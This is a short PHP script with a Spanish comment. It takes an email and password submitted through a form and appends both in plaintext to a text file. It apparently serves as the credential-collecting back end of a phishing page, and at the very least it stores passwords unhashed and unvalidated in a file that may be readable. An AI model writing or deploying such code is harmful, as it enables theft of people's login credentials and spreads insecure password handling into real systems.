<?php
$email = $_POST['email'];
$password = $_POST['password'];

// Aquí puedes guardar los datos en un archivo o base de datos
$file = 'datos.txt';
$current = file_get_contents($file);
$current .= "Email: $email - Contraseña: $password\n";
file_put_contents($file, $current);
?>
